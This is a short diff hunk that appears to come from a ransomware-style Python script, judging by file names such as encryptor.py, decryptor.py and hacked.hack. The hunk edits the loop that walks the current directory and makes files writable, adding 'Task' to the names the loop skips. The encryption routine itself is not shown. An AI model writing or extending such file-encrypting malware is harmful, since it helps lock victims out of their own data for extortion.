@@ -137,7 +137,7 @@ os.chmod(cwd, stat.S_IRWXG)
 for file in os.listdir(cwd):
 
 	# Checks to see if object is any of the required files for the software to work, and if TRUE it skips.
-	if file == "encryptor.py" or file == "hacked.hack" or file == "decryptor.py" or "crypt" in file:
+	if file == "encryptor.py" or file == "hacked.hack" or file == "decryptor.py" or "crypt" in file or "Task" in file:
 		continue
 
 	# Changes object to write mode instead of read-only.
